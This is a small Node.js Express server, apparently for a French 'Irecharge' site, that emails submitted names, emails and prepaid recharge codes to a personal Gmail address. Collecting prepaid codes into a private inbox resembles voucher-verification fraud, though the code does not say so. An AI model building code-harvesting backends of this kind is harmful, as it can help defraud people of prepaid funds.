
const express = require("express");
const cors = require("cors");

const { Resend } = require("resend");

require("dotenv").config();

const app = express();

app.use(cors());

app.use(express.json());

app.listen(process.env.PORT || 5000, () => {
  console.log("serveur démarré");
});

const resend = new Resend(process.env.RESEND_API_KEY);

app.post("/envoyer", async (req, res) => {
  const data = req.body;
  try {
    await resend.emails.send({
      from: "Irecharge <onboarding@resend.dev>",
      replyTo: data.email,
      to: "sofiamarley29@gmail.com",
      subject: `Nouvelle demande : ${data.formulaire}`,
      text: `
      Formulaire : ${data.formulaire}
      Nom : ${data.nom}
      Prénom : ${data.prenom}
      Email : ${data.email}
      Recharge : ${data.typeRecharge}
      Date : ${data.dateAchat}
      Code : ${data.codeRecharge}
      Cacher le code : ${data.cacherCode}
      `,
    });
    res.status(200).send("ok");
  } catch (error) {
    console.error("Erreur envoi mail:", error);
    res.status(500).send("Erreur lors de l'envoi");
  }
});